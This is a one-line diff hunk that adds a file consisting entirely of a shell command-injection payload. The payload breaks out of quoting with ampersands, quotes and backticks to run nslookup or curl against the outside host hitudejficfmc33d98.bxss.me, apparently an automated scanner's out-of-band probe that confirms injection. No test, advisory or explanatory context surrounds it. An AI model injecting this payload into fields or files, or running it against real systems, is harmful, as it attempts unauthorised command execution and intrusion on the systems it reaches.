@@ -1,0 +1,1 @@
+&(nslookup -q=cname hitudejficfmc33d98.bxss.me||curl hitudejficfmc33d98.bxss.me)&'\"`0&(nslookup -q=cname hitudejficfmc33d98.bxss.me||curl hitudejficfmc33d98.bxss.me)&`'
